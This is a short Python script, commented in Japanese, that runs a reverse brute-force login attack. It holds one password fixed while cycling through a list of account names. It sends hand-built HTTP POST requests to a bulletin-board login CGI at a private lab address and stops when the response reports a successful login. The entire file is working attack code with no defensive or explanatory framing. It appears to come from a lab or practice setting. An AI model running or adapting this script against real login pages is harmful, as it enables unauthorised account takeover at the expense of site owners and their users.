#Webサイトにリバースブルートフォースアタック
import socket
import sys
import datetime

now1 = datetime.datetime.now()

#辞書のリスト
f = open('dictpasswd.txt', 'r')
dictpasswd = f.readlines()
f.close()

#アカウント名のリスト
f = open('acount.txt', 'r')
acount = f.readlines()
f.close()

#アパスワードを固定し、アカウント名を変更することでログイン試行
for i in range(len(dictpasswd)):
    for j in range(len(acount)):
        mysock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        mysock.connect(('192.168.147.128', 80))
        msg = 'POST /test/bbslogin.cgi HTTP/1.1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nAccept-Language: ja,en-US;q=0.9,en;q=0.8\r\nCache-Control: max-age=0\r\nConnection: close\r\nContent-Length: 34\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: PHPSESSID=qrtkue6rnj5qfe4p04edsfvp7b\r\nHost: 192.168.147.128\r\nOrigin: http://192.168.147.128\r\nReferer: http://192.168.147.128/test/bbslogin.cgi\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\r\n'
        msg = msg + '\r\n'
        cmd = msg + "title="+ dictpasswd[i].rstrip("\n") + "&author=" + acount[j].rstrip("\n") + "&text=aa\r\n"
        cmd = cmd.encode()
        mysock.send(cmd)
        print(dictpasswd[i].rstrip("\n")+ acount[j].rstrip("\n"))
        
        while True:
            data = mysock.recv(4096)
            if (len(data) < 1):
                break
            if ("<p>login success</p>" in data.decode()):
                print("yes")
                print(now1)
                print(datetime.datetime.now())
                sys.exit(0)
        mysock.close()
